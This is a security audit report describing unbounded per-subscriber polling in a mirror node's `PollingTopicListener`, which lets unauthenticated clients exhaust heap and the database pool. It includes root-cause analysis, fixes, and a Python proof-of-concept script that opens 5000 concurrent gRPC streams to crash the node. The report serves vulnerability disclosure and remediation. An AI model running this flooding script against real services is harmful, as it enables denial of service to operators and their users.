# Audit Report

## Title
Unbounded Subscriber Resource Exhaustion in `PollingTopicListener.listen()` via Missing Global Subscriber Cap

## Summary
`PollingTopicListener.listen()` allocates a new `PollingContext` and a perpetual `RepeatSpec.times(Long.MAX_VALUE)` polling loop for every subscriber, with no check against any maximum subscriber count. The only server-side guard (`maxConcurrentCallsPerConnection = 5`) limits calls per TCP connection, not total connections. An unprivileged attacker opening many connections can accumulate thousands of active polling subscriptions, each consuming heap, scheduler task slots, and a database query every 500 ms, collectively exhausting JVM heap and crashing the mirror node.

## Finding Description

**Exact code path — `PollingTopicListener.listen()` lines 34–49:**

Every call to `listen()` unconditionally allocates a new `PollingContext` and schedules an infinite polling loop: [1](#0-0) 

There is no check before or inside this method that limits how many times it may be called concurrently.

**Root cause — `subscriberCount` is a metric, not a guard:**

`TopicMessageServiceImpl` tracks active subscribers in an `AtomicLong`, but it is registered only as a Micrometer `Gauge` and is **never compared against any maximum** to reject new subscriptions: [2](#0-1) [3](#0-2) 

**Why the existing guard is insufficient:**

`GrpcConfiguration` applies only `maxConcurrentCallsPerConnection`, which limits RPC calls per TCP connection, not the total number of TCP connections: [4](#0-3) 

The default value is 5: [5](#0-4) 

No `maxConnections` is configured anywhere in `GrpcConfiguration`. An attacker opens N connections × 5 calls = 5N simultaneous subscriptions.

**`ListenerProperties` has no subscriber cap field:** [6](#0-5) 

**Per-subscription resource cost (POLL mode):**
- One `PollingContext` instance (heap: `AtomicLong` + `AtomicReference` + `TopicMessageFilter`)
- One perpetual `RepeatSpec.times(Long.MAX_VALUE)` task chain on the shared `boundedElastic()` scheduler
- One `topicMessageRepository.findByFilter()` database query fired every 500 ms [7](#0-6) 

**Contrast with shared listeners:**

`SharedPollingTopicListener` uses a single upstream flux with `.share()`, so all subscribers share one polling loop regardless of subscriber count: [8](#0-7) 

`RedisTopicListener` similarly uses `.share()` per topic channel: [9](#0-8) 

`PollingTopicListener` is a **cold publisher** — every subscriber gets its own independent polling loop, making it uniquely vulnerable to per-subscriber resource multiplication.

## Impact Explanation

With thousands of active subscriptions:

1. **Heap exhaustion** — accumulated `PollingContext` objects and queued Reactor task chains grow without bound.
2. **Scheduler saturation** — `Schedulers.boundedElastic()` caps threads at `10 × CPU cores` but queues tasks unboundedly; the task queue itself consumes heap.
3. **Database connection pool exhaustion** — each subscription fires a query every 500 ms; with a shared pool, legitimate queries are starved.
4. **OOM crash** — once heap is exhausted, the JVM throws `OutOfMemoryError`, crashing the mirror node process.

## Likelihood Explanation

- **No authentication required**: The gRPC `subscribeTopic` endpoint is public.
- **No rate limiting on the gRPC service**: Unlike the web3 module (which uses Bucket4j), the gRPC module has no request-rate or connection-rate limiter.
- **Low attacker capability**: Opening thousands of TCP connections and issuing gRPC streaming calls requires only a standard gRPC client library and a valid (or any, if `checkTopicExists=false`) topic ID.
- **Repeatable**: The attack can be re-launched after a node restart with no state to clear.
- **Condition**: The listener type must be configured as `POLL` (`hiero.mirror.grpc.listener.type=POLL`). The default is `REDIS`, which uses a shared flux and is not vulnerable. However, `POLL` is a documented, supported configuration option in `ListenerProperties.ListenerType`. [10](#0-9) 

## Recommendation

1. **Add a global subscriber cap** in `ListenerProperties` (e.g., `maxSubscribers`) and enforce it at the entry point of `TopicMessageServiceImpl.subscribeTopic()` by comparing `subscriberCount.get()` against the cap before allowing a new subscription — returning an appropriate gRPC `RESOURCE_EXHAUSTED` status if exceeded.
2. **Configure a `maxConnections` limit** in `GrpcConfiguration` via `NettyServerBuilder.maxConnectionAge()` / connection limits to bound the total number of TCP connections independently of per-connection call limits.
3. **Consider preferring `SHARED_POLL` or `REDIS`** over `POLL` in deployments, and document the resource implications of the `POLL` mode clearly.

## Proof of Concept

```python
import grpc
import threading
from mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2

TARGET = "mirror-node:5600"
TOPIC_ID = 1  # any valid topic

def open_subscription():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_service_pb2.ConsensusTopicQuery(
        topic_id=...,  # set to TOPIC_ID
    )
    try:
        for _ in stub.subscribeTopic(req):
            pass  # consume nothing, keep stream open
    except Exception:
        pass

# Open 1000 connections × 5 streams = 5000 simultaneous POLL subscriptions
threads = []
for _ in range(1000):
    for _ in range(5):
        t = threading.Thread(target=open_subscription, daemon=True)
        t.start()
        threads.append(t)

# Each subscription fires a DB query every 500ms
# After ~60s, JVM heap and DB pool are exhausted → OOM crash
for t in threads:
    t.join()
```

Each open stream causes `PollingTopicListener.listen()` to be called once, allocating a new `PollingContext` and scheduling a perpetual polling loop. With 5000 concurrent subscriptions each querying the database every 500 ms, the mirror node's heap and database connection pool are exhausted.

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }

    private Flux<TopicMessage> subscribe(Topic topic) {
        Duration interval = listenerProperties.getInterval();

        return container
                .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
                .map(Message::getMessage)
                .doOnCancel(() -> unsubscribe(topic))
                .doOnComplete(() -> unsubscribe(topic))
                .doOnError(t -> log.error("Error listening for messages", t))
                .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
                .share();
